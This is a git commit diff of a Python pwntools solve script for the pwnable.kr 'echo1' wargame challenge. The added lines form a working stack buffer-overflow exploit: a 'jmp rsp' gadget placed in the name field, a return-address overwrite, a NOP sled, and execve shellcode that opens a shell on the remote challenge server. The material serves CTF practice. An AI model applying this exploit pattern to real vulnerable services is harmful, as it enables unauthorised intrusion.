38cd4138e2d487e072bf0d505eb327baa5a76c0d
freewalk <fr33w4lk@gmail.com>
2019-06-04 15:58:33 +1000

    finished echo1

--- pwnable.kr/rookiss/echo1/solve.py
+++ pwnable.kr/rookiss/echo1/solve.py
@@ -6,14 +6,17 @@ context.log_level = "DEBUG"
 context.terminal = ['tmux', 'splitw', '-v']
 
 def run():
-    #p = remote("pwnable.kr", 9010)
-    p = process("./echo1")
+    p = remote("pwnable.kr", 9010)
+    #p = process("./echo1")
 
     #gdb.attach(p, '''
+    #b*echo1+83
     #continue
     #''')
 
-    name = "A" * 24
+    jmp = p64(0xe4ff)# "\xe4\xff" # jmp rsp
+
+    name = jmp + "A" * (24 - len(jmp))
     p.recvuntil("hey, what's your name? : ")
     p.sendline(name)
 
@@ -22,14 +25,16 @@ def run():
 
     p.recvuntil("hello ")
 
-    #ret = "\x10" + os.urandom(3) + "\x00\x00\x00\x00"
-    #ret = "A" * 4
-    ret = p64(0x602098)
+    # addr of ID, 4 bytes we control
+    ret = p64(0x006020a0)
 
-    payload = "A" * 40 + ret
+    nop = "\x90" * 8
+    shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
+
+    payload = "A" * 40 + ret + nop + shellcode
     p.sendline(payload)
 
-    #p.interactive()
-    p.close()
+    p.interactive()
+    #p.close()
 
 run()
